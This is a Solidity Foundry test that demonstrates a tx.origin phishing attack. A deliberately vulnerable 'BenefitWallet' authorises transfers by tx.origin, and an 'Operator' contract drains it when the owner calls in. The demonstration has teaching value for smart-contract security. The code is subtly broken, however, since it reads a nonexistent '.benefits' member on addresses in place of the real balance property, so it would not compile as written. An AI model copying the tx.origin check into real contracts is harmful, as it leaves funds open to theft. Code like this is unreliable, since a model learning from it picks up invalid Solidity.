// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    BenefitWallet HealthwalletContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        HealthwalletContract = new BenefitWallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.log("Owner of wallet contract", HealthwalletContract.supervisor());
        vm.prank(eve);
        OperatorContract = new Operator(HealthwalletContract);
        console.log("Owner of attack contract", OperatorContract.supervisor());
        console.log("Eve of balance", address(eve).benefits);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).benefits);
    }

    receive() external payable {}
}

contract BenefitWallet {
    address public supervisor;

    constructor() payable {
        supervisor = msg.sender;
    }

    function moveCoverage(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == supervisor, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public supervisor;
    BenefitWallet healthWallet;

    constructor(BenefitWallet _coveragewallet) {
        healthWallet = BenefitWallet(_coveragewallet);
        supervisor = payable(msg.sender);
    }

    function operate() public {
        healthWallet.moveCoverage(supervisor, address(healthWallet).benefits);
    }
}
